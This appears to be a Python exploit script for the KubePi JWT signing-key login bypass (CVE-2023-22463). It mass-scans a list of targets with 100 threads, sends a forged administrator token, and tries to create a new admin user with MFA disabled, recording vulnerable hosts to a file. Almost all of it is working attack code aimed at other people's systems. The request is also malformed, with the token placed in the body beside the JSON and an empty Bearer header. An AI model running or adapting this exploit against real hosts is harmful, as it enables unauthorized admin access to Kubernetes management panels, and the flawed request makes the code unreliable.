#KubePi JwtSigKey 登陆绕过漏洞CVE-2023-22463

import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""██   ██ ██    ██ ██████  ███████ ██████  ██ 
██  ██  ██    ██ ██   ██ ██      ██   ██ ██ 
█████   ██    ██ ██████  █████   ██████  ██ 
██  ██  ██    ██ ██   ██ ██      ██      ██ 
██   ██  ██████  ██████  ███████ ██      ██ 
                                            author:CHKer
                                            version:1.0.0
"""
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='KubePi JwtSigKey 登陆绕过漏洞CVE-2023-22463')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/kubepi/api/v1/users'
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36',
        'accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate',
        'Authorization': 'Bearer' 
    }

    data='''eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8

{
  "authenticate": {
       "password": "{{randstr}}"
  },
  "email": "{{randstr}}@qq.com",
  "isAdmin": true,
  "mfa": {
          "enable": false
   },
  "name": "{{randstr}}",
  "nickName": "{{randstr}}",
  "roles": [
       "Supper User"
  ]
}'''
    proxies =  {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1=requests.post(url=target+payload,headers=headers,verify=False,data=data,proxies=proxies)
        if res1.status_code==200:
                    print(f"[+]目标存在 {target}")
                    with open('result22.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()
